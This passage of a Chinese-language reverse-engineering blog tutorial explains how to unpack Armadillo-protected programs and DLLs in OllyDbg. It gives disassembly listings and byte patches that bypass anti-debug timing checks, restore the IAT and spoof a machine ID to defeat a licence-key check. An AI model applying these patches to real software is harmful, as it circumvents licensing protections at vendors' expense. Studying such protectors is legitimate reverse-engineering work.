class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[XXXX+<span class="number">4</span>],<span class="number">1</span>  //XXXX为第二个<span class="keyword">CMP</span>[]内的值</div><div class="line"><span class="keyword">jmp</span> XXXX  //第一个<span class="keyword">CMP</span>前的地址</div><div class="line">//</div><div class="line">//patch后的数据</div><div class="line">0060FF16      FF85 CCF5FFFF        <span class="keyword">inc</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xA34</span>]             <span class="comment">;  patch</span></div><div class="line">0060FF1C      C705 4CAF6400 <span class="number">010000</span>&gt;<span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x64AF4C</span>],<span class="number">0x1</span></div><div class="line">0060FF26    ^ E9 18FFFFFF          <span class="keyword">jmp</span> MAGCT.0060FE43</div><div class="line">0060FF2B      <span class="number">90</span>                   <span class="keyword">nop</span></div><div class="line">0060FF2C      <span class="number">90</span>                   <span class="keyword">nop</span></div><div class="line">0060FF2D      <span class="number">90</span>                   <span class="keyword">nop</span></div></pre></td></tr></table></figure></li><li><p>接着shift+F9,中断在006100F8处,就可以dump处子进程了</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">006100EE   &gt; \C785 D8F5FFFF <span class="number">020001</span>&gt;<span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xA28</span>],<span class="number">0x10002</span>     <span class="comment">;  UNICODE "::=::\"</span></div><div class="line">006100F8   &gt;  E9 D4100000          <span class="keyword">jmp</span> MAGCT.006111D1</div><div class="line">006100FD   &gt;  8B0D B0436400        <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x6443B0</span>]</div><div class="line"><span class="number">00610103</span>   .  81F1 050000C0        <span class="keyword">xor</span> <span class="built_in">ecx</span>,<span class="number">0xC0000005</span></div><div class="line"><span class="number">00610109</span>   .  <span class="number">398D</span> D4F5FFFF        <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xA2C</span>],<span class="built_in">ecx</span></div><div class="line">0061010F   .  0F85 <span class="number">92040000</span>        <span class="keyword">jnz</span> MAGCT.006105A7</div><div class="line"><span class="number">00610115</span>   .  <span class="number">70</span> <span class="number">07</span>                <span class="keyword">jo</span> XMAGCT.0061011E</div><div class="line"><span class="number">00610117</span>   .  7C <span class="number">03</span>                <span class="keyword">jl</span> XMAGCT.0061011C</div><div class="line"><span class="number">00610119</span>   &gt;  EB <span class="number">05</span>                <span class="keyword">jmp</span> XMAGCT<span class="meta">.00610120</span></div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来就是还原IAT </p><ul><li>首先对DebugActiveProcess下断点<code>BP DebugActiveProcess</code>这样是为了寻找子进程，在堆栈窗口发现子进程ID为D84(不定)。接着重新打开一个OD，附加子进程，然后F9+F12，中断在入口点<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">0012</span>BCBC   <span class="number">0060</span>F71A  /CALL 到 DebugActiveProcess 来自 MAGCT<span class="number">.0060</span>F714</div><div class="line"><span class="number">0012</span>BCC0   <span class="number">00000</span>DB4  \ProcessId = DB4</div></pre></td></tr></table></figure></li></ul><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="number">0061F743</span> &gt;/$- EB FE         jmp XMAGCT.&lt;ModuleEntryPoint&gt;</div><div class="line"><span class="number">0061F745</span>  |?  EC            <span class="keyword">in</span> al,dx</div><div class="line"><span class="number">0061F746</span>  |.  6A FF         <span class="built_in">push</span> -<span class="number">0x1</span></div><div class="line"><span class="number">0061F748</span>  |.  <span class="number">68</span> <span class="number">209B6400</span>   <span class="built_in">push</span> MAGCT.00649B20</div><div class="line"><span class="number">0061F74D</span>  |.  <span class="number">68</span> 80F46100   <span class="built_in">push</span> MAGCT.<span class="number">0061F480</span>                      ;  SE 处理程序安装</div><div class="line"><span class="number">0061F752</span>  |.  <span class="number">64</span>:A1 <span class="number">0000000</span>&gt;mov eax,dword ptr fs:[<span class="number">0</span>]</div><div class="line"><span class="number">0061F758</span>  |.  <span class="number">50</span>            <span class="built_in">push</span> eax</div></pre></td></tr></table></figure><ul><li><p>将死跳转字节<code>EB FE</code>正常指令字节<code>55 8B</code>,然后就可以执行我们上节讲的双变单了。在401000修改完双转单代码后，shift+F9跑起来，再次中断在OpenMutexA处。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="number">0061F743</span> &gt;    <span class="number">55</span>            <span class="built_in">push</span> ebp</div><div class="line"><span class="number">0061F744</span>      8BEC          mov ebp,esp</div><div class="line"><span class="number">0061F746</span>  |.  6A FF         <span class="built_in">push</span> -<span class="number">0x1</span></div><div class="line"><span class="number">0061F748</span>  |.  <span class="number">68</span> <span class="number">209B6400</span>   <span class="built_in">push</span> MAGCT.00649B20</div></pre></td></tr></table></figure></li><li><p>然后对GetModuleHandle下硬件断点。<code>HE GetModuleHandle</code>,经过VirtualAlloc和VirtualFree到达,然后返回，修改Magic_JMp.<strong>在此之前关闭硬件断点</strong></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">001265</span>F4   <span class="number">00</span>F9ACC1  /CALL 到 GetModuleHandleA 来自 <span class="number">00</span>F9ACBB</div><div class="line"><span class="number">001265</span>F8   <span class="number">00126738</span>  \pModule = <span class="string">"kernel32.dll"</span></div></pre></td></tr></table></figure></li><li><p>初次以外还有一个时间校验，对GetTickCount下断，执行到返回</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">00E89116    FF15 AC22E900   <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[E922AC] <span class="comment">; kernel32.GetTickCount</span></div><div class="line">00E8911C    2B85 8CC3FFFF   <span class="keyword">sub</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-3C74]</div><div class="line">00E89122    8B8D 90C3FFFF   <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-3C70]</div><div class="line">00E89128    6BC9 <span class="number">32</span>         <span class="keyword">imul</span> <span class="built_in">ecx</span>,<span class="built_in">ecx</span>,<span class="number">32</span></div><div class="line">00E8912B    81C1 D0070000   <span class="keyword">add</span> <span class="built_in">ecx</span>,7D0</div><div class="line">00E89131    3BC1            <span class="keyword">cmp</span> <span class="built_in">eax</span>,<span class="built_in">ecx</span></div><div class="line">00E89133    <span class="number">76</span> <span class="number">07</span>           <span class="keyword">jbe</span> short 00E8913C  //修改为：<span class="keyword">JMP</span> 00E8913C </div><div class="line">00E89135    C685 20C8FFFF <span class="number">0</span>&gt;<span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-37E0],<span class="number">1</span></div><div class="line">00E8913C    83BD D0C6FFFF <span class="number">0</span>&gt;<span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">3930</span>],<span class="number">0</span></div><div class="line">00E89143    0F85 8A000000   <span class="keyword">jnz</span> 00E891D3</div></pre></td></tr></table></figure></li><li><p>然后用ImportRCE修复即可！</p></li></ul><h2 id="0x4-带KEY的Armadillo"><a href="#0x4-带KEY的Armadillo" class="headerlink" title="0x4 带KEY的Armadillo"></a>0x4 带KEY的Armadillo</h2><h3 id="0x4-1-单进程"><a href="#0x4-1-单进程" class="headerlink" title="0x4.1 单进程"></a>0x4.1 单进程</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;带KEY的Armadillo相当于给软件多了一层保护，我们此时还不能通过爆破的方式解决这个KEY，原因有2，第一，OD对于这类情况不提供修改的选项，第二，就算爆破成功了，后期软件中还存在暗桩。所以可以逆向算法的方式得到一组合适的KEY。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先shitf+F9运行起来，不要管出现的对话框，首先随便输入个Key，然后下<code>HE GetDlgItem</code>断点即可。取消断点，ALT+F9执行返回。大概停在此处。<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="number">021B44FC</span>    85C0            test eax,eax</div><div class="line"><span class="number">021B44FE</span>    <span class="number">74</span> <span class="number">33</span>           je X021B4533</div><div class="line"><span class="number">021B4500</span>    BB <span class="number">00010000</span>     mov ebx,<span class="number">0x100</span></div><div class="line"><span class="number">021B4505</span>    8D85 <span class="number">00FFFFFF</span>   lea eax,dword ptr ss:[ebp-<span class="number">0x100</span>]</div><div class="line"><span class="number">021B450B</span>    <span class="number">53</span>              <span class="built_in">push</span> ebx</div><div class="line"><span class="number">021B450C</span>    <span class="number">50</span>              <span class="built_in">push</span> eax</div><div class="line"><span class="number">021B450D</span>    <span class="number">57</span>              <span class="built_in">push</span> edi</div><div class="line"><span class="number">021B450E</span>    FF75 <span class="number">08</span>         <span class="built_in">push</span> dword ptr ss:[ebp+<span class="number">0x8</span>]</div><div class="line"><span class="number">021B4511</span>    FFD6            call esi</div><div class="line"><span class="number">021B4513</span>    8B3D E0641C02   mov edi,dword ptr ds:[<span class="number">0x21C64E0</span>]         ; USER32.GetWindowTextA</div><div class="line"><span class="number">021B4519</span>    <span class="number">50</span>              <span class="built_in">push</span> eax</div><div class="line"><span class="number">021B451A</span>    FFD7            call edi</div><div class="line"><span class="number">021B451C</span>    8D85 <span class="number">00FEFFFF</span>   lea eax,dword ptr ss:[ebp-<span class="number">0x200</span>]</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后向上找，找到这个函数开始地方，也就是上一个ret的下个指令.然后下硬件执行断点。然后重新载入，shitf+F9<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="number">021B4462</span>    <span class="number">40</span>              inc eax</div><div class="line"><span class="number">021B4463</span>    C3              retn</div><div class="line"><span class="number">021B4464</span>    <span class="number">55</span>              <span class="built_in">push</span> ebp</div><div class="line"><span class="number">021B4465</span>    8BEC            mov ebp,esp</div><div class="line"><span class="number">021B4467</span>    81EC <span class="number">00040000</span>   sub esp,<span class="number">0x400</span></div><div class="line"><span class="number">021B446D</span>    <span class="number">8B45</span> <span class="number">0C</span>         mov eax,dword ptr ss:[ebp+<span class="number">0xC</span>]</div><div class="line"><span class="number">021B4470</span>    <span class="number">53</span>              <span class="built_in">push</span> ebx</div><div class="line"><span class="number">021B4471</span>    <span class="number">56</span>              <span class="built_in">push</span> esi</div><div class="line"><span class="number">021B4472</span>    2D <span class="number">10010000</span>     sub eax,<span class="number">0x110</span></div><div class="line"><span class="number">021B4477</span>    <span class="number">57</span>              <span class="built_in">push</span> edi</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时中断在之前下的执行断点处。单步走到021B4478处的第一个大跳转<code>je 021B45F2</code>右键跟随。<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="number">021B4464</span>    <span class="number">55</span>              <span class="built_in">push</span> ebp</div><div class="line"><span class="number">021B4465</span>    8BEC            mov ebp,esp</div><div class="line"><span class="number">021B4467</span>    81EC <span class="number">00040000</span>   sub esp,<span class="number">0x400</span></div><div class="line"><span class="number">021B446D</span>    <span class="number">8B45</span> <span class="number">0C</span>         mov eax,dword ptr ss:[ebp+<span class="number">0xC</span>]</div><div class="line"><span class="number">021B4470</span>    <span class="number">53</span>              <span class="built_in">push</span> ebx</div><div class="line"><span class="number">021B4471</span>    <span class="number">56</span>              <span class="built_in">push</span> esi</div><div class="line"><span class="number">021B4472</span>    2D <span class="number">10010000</span>     sub eax,<span class="number">0x110</span></div><div class="line"><span class="number">021B4477</span>    <span class="number">57</span>              <span class="built_in">push</span> edi</div><div class="line"><span class="number">021B4478</span>    <span class="number">0F84</span> <span class="number">74010000</span>   je <span class="number">021B45F2</span></div><div class="line"><span class="number">021B447E</span>    <span class="number">48</span>              dec eax</div><div class="line"><span class="number">021B447F</span>    <span class="number">74</span> <span class="number">07</span>           je X021B4488</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;跟随到021B45F2处，F2下断点，执行到此处，继续单步跟。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="number">021B45F2</span>    F645 <span class="number">17</span> <span class="number">80</span>      test byte ptr ss:[ebp+<span class="number">0x17</span>],<span class="number">0x80</span></div><div class="line"><span class="number">021B45F6</span>    8B7D <span class="number">08</span>         mov edi,dword ptr ss:[ebp+<span class="number">0x8</span>]</div><div class="line"><span class="number">021B45F9</span>    <span class="number">74</span> <span class="number">12</span>           je X021B460D</div><div class="line"><span class="number">021B45FB</span>    <span class="number">8065</span> <span class="number">17</span> 7F      <span class="keyword">and</span> byte ptr ss:[ebp+<span class="number">0x17</span>],<span class="number">0x7F</span></div><div class="line"><span class="number">021B45FF</span>    6A <span class="number">01</span>           <span class="built_in">push</span> <span class="number">0x1</span></div><div class="line"><span class="number">021B4601</span>    <span class="number">68</span> 5CC91C02     <span class="built_in">push</span> <span class="number">0x21CC95C</span></div><div class="line"><span class="number">021B4606</span>    <span class="number">57</span>              <span class="built_in">push</span> edi</div><div class="line"><span class="number">021B4607</span>    FF15 C0641C02   call dword ptr ds:[<span class="number">0x21C64C0</span>]        ; USER32.SetPropA</div><div class="line"><span class="number">021B460D</span>    <span class="number">8B35</span> E8641C02   mov esi,dword ptr ds:[<span class="number">0x21C64E8</span>]         ; USER32.GetDlgItem</div><div class="line"><span class="number">021B4613</span>    6A <span class="number">01</span>           <span class="built_in">push</span> <span class="number">0x1</span></div><div class="line"><span class="number">021B4615</span>    <span class="number">57</span>              <span class="built_in">push</span> edi</div><div class="line"><span class="number">021B4616</span>    FFD6            call esi</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一直到021B4689处<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="number">021B467D</span>   /<span class="number">0F84</span> B7000000   je <span class="number">021B473A</span></div><div class="line"><span class="number">021B4683</span>   |<span class="number">53</span>              <span class="built_in">push</span> ebx</div><div class="line"><span class="number">021B4684</span>   |B9 98FA1C02     mov ecx,<span class="number">0x21CFA98</span></div><div class="line"><span class="number">021B4689</span>   |E8 253CFEFF     call <span class="number">021982B3</span>                            ; 跟入</div><div class="line"><span class="number">021B468E</span>   |<span class="number">53</span>              <span class="built_in">push</span> ebx</div><div class="line"><span class="number">021B468F</span>   |B9 98FA1C02     mov ecx,<span class="number">0x21CFA98</span></div><div class="line"><span class="number">021B4694</span>   |<span class="number">8945</span> <span class="number">08</span>         mov dword ptr ss:[ebp+<span class="number">0x8</span>],eax</div><div class="line"><span class="number">021B4697</span>   |E8 353CFEFF     call <span class="number">021982D1</span></div><div class="line"><span class="number">021B469C</span>   |837D <span class="number">14</span> <span class="number">01</span>      cmp dword ptr ss:[ebp+<span class="number">0x14</span>],<span class="number">0x1</span></div><div class="line"><span class="number">021B46A0</span>   |<span class="number">75</span> <span class="number">27</span>           jnz X021B46C9</div><div class="line"><span class="number">021B46A2</span>   |<span class="number">8B45</span> <span class="number">08</span>         mov eax,dword ptr ss:[ebp+<span class="number">0x8</span>]</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在021982C2步入，执行到021A59FA处可以发现EAX就是硬件号<code>3C6663B2</code>。接着在一个可以执行的代码段打补丁<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="number">021982B3</span>    <span class="number">56</span>              <span class="built_in">push</span> esi</div><div class="line"><span class="number">021982B4</span>    8BF1            mov esi,ecx</div><div class="line"><span class="number">021982B6</span>    FF7424 <span class="number">08</span>       <span class="built_in">push</span> dword ptr ss:[esp+<span class="number">0x8</span>]</div><div class="line"><span class="number">021982BA</span>    8B8E 5C060000   mov ecx,dword ptr ds:[esi+<span class="number">0x65C</span>]</div><div class="line"><span class="number">021982C0</span>    6A <span class="number">00</span>           <span class="built_in">push</span> <span class="number">0x0</span></div><div class="line"><span class="number">021982C2</span>    E8 24D70000     call <span class="number">021A59EB</span>                    ;步入</div><div class="line"><span class="number">021982C7</span>    <span class="number">3386</span> 5C200000   xor eax,dword ptr ds:[esi+<span class="number">0x205C</span>]</div><div class="line"><span class="number">021982CD</span>    5E              <span class="built_in">pop</span> esi</div><div class="line">//</div><div class="line"><span class="number">021A59EB</span>    <span class="number">8B4424</span> <span class="number">04</span>       mov eax,dword ptr ss:[esp+<span class="number">0x4</span>]</div><div class="line"><span class="number">021A59EF</span>    C1E0 <span class="number">06</span>         shl eax,<span class="number">0x6</span></div><div class="line"><span class="number">021A59F2</span>    <span class="number">034424</span> <span class="number">08</span>       add eax,dword ptr ss:[esp+<span class="number">0x8</span>]</div><div class="line"><span class="number">021A59F6</span>    <span class="number">8B4481</span> <span class="number">18</span>       mov eax,dword ptr ds:[ecx+eax*<span class="number">4</span>+<span class="number">0x18</span>]</div><div class="line"><span class="number">021A59FA</span>    <span class="number">35</span> 8AC0E665     xor eax,<span class="number">0x65E6C08A</span></div><div class="line">//</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ctrl+g，输入00401000然后输入如下内容<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">xor</span>     <span class="built_in">eax</span>, 65E6C08A  </div><div class="line"><span class="keyword">cmp</span>     <span class="built_in">eax</span>, 5980A338   <span class="comment">; 判断 EAX 是否是我的机器码( )</span></div><div class="line"><span class="keyword">jnz</span>     <span class="number">00401011</span>         <span class="comment">;不是则返回</span></div><div class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, 5F48DD41    <span class="comment">;如果是,则修改为5F48DD41</span></div><div class="line"><span class="keyword">retn</span>    <span class="number">8</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;打好补丁后，在401000处F2下下断点，然后返回，剩下的使用上面讲的方法就可以脱去。</p><h3 id="0x4-1-双进程"><a href="#0x4-1-双进程" class="headerlink" title="0x4.1 双进程"></a>0x4.1 双进程</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;得鸽一下。</p><h2 id="0x5-DLL脱壳"><a href="#0x5-DLL脱壳" class="headerlink" title="0x5 DLL脱壳"></a>0x5 DLL脱壳</h2><h3 id="0x5-1-DLL脱壳"><a href="#0x5-1-DLL脱壳" class="headerlink" title="0x5.1 DLL脱壳"></a>0x5.1 DLL脱壳</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;修改Magic_Jmp绕过IAT加密。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">02995E53    395F FC         <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edi</span>-<span class="number">0x4</span>],<span class="built_in">ebx</span></div><div class="line">02995E56  ^ 0F85 49FEFFFF   <span class="keyword">jnz</span> 02995CA5</div><div class="line">02995E5C    EB <span class="number">03</span>           <span class="keyword">jmp</span> X02995E61</div><div class="line">02995E5E    D6              <span class="keyword">salc</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来就是和exe脱壳不一样的地方，处理重定位表。<strong>大佬这边的操作有点不明白，哪位师傅如果知道告知一下。</strong>首先对GetTickCount下硬件断点<code>HE GetTickCount</code>,然后shitf+f9，观察堆栈是这个结果的话，删除断点，并返回.程序停在029AC3C8处。<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">00129220 </span>  <span class="number">029</span>AC3C8  /<span class="keyword">CALL</span> 到 GetTickCount 来自 <span class="number">029</span>AC3C2</div></pre></td></tr></table></figure></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">029AC3C8    2B85 A4D4FFFF   <span class="keyword">sub</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2B5C</span>]</div><div class="line">029AC3CE    8B8D A8D4FFFF   <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2B58</span>]</div><div class="line">029AC3D4    6BC9 <span class="number">32</span>         <span class="keyword">imul</span> <span class="built_in">ecx</span>,<span class="built_in">ecx</span>,<span class="number">0x32</span></div><div class="line">029AC3D7    81C1 D0070000   <span class="keyword">add</span> <span class="built_in">ecx</span>,<span class="number">0x7D0</span></div><div class="line">029AC3DD    3BC1            <span class="keyword">cmp</span> <span class="built_in">eax</span>,<span class="built_in">ecx</span></div><div class="line">029AC3DF    <span class="number">76</span> <span class="number">07</span>           <span class="keyword">jbe</span> X029AC3E8</div><div class="line">029AC3E1    C685 34D9FFFF <span class="number">0</span>&gt;<span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x26CC</span>],<span class="number">0x1</span></div><div class="line">029AC3E8    83BD E4D7FFFF <span class="number">0</span>&gt;<span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x281C</span>],<span class="number">0x0</span></div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后ctrl+s，搜索,之后在找到的地址下断运行。就会出现如下黄色字体，记住标记的重定位RVA=6000和size=3B0.并将029ACFB8处跳转改为<strong>绝对跳转</strong>。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">PUSH</span> <span class="built_in">EAX</span></div><div class="line"><span class="keyword">XCHG</span> <span class="built_in">CX</span>,<span class="built_in">CX</span></div><div class="line"><span class="keyword">POP</span> <span class="built_in">EAX</span></div><div class="line"><span class="keyword">STC</span></div></pre></td></tr></table></figure></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">029ACF59    C705 E0C09B02 <span class="number">6</span>&gt;<span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x29BC0E0</span>],<span class="number">0x29BCB60</span>   <span class="comment">; 重定位表RVA为6000</span></div><div class="line">029ACF63    A1 E49F9C02     <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x29C9FE4</span>]</div><div class="line">029ACF68    8B00            <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>]</div><div class="line">029ACF6A    <span class="number">8985</span> 3CD9FFFF   <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x26C4</span>],<span class="built_in">eax</span></div><div class="line">029ACF70    A1 E49F9C02     <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x29C9FE4</span>]</div><div class="line">029ACF75    83C0 <span class="number">04</span>         <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="number">0x4</span></div><div class="line">029ACF78    A3 E49F9C02     <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x29C9FE4</span>],<span class="built_in">eax</span></div><div class="line">029ACF7D    A1 E49F9C02     <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x29C9FE4</span>]</div><div class="line">029ACF82    8B00            <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>]               <span class="comment">; 重定位表的大小为03B0</span></div><div class="line">029ACF84    <span class="number">8985</span> 78D9FFFF   <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2688</span>],<span class="built_in">eax</span></div><div class="line">029ACF8A    A1 E49F9C02     <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x29C9FE4</span>]</div><div class="line">029ACF8F    83C0 <span class="number">04</span>         <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="number">0x4</span></div><div class="line">029ACF92    A3 E49F9C02     <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x29C9FE4</span>],<span class="built_in">eax</span></div><div class="line">029ACF97    83BD 3CD9FFFF <span 